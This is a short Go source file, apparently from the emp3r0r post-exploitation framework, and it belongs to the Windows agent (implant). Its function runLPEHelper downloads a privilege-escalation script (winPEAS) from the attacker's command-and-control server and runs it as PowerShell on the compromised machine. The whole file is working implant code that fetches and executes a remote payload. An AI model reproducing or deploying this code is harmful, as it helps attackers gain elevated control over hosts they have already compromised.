//go:build windows
// +build windows

package agent

import (
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func runLPEHelper(method string) (out string) {
	if method != "lpe_winpeas" {
		return "Only lpe_winpeas is supported for now"
	}

	log.Printf("Downloading LPE script from %s", emp3r0r_data.CCAddress+method)
	var scriptData []byte
	scriptData, err := DownloadViaCC(method, "")
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	log.Printf("Running LPE helper %s", method)
	out, err = RunPSScript(scriptData)
	if err != nil {
		return "LPE error: " + string(out)
	}
	return
}
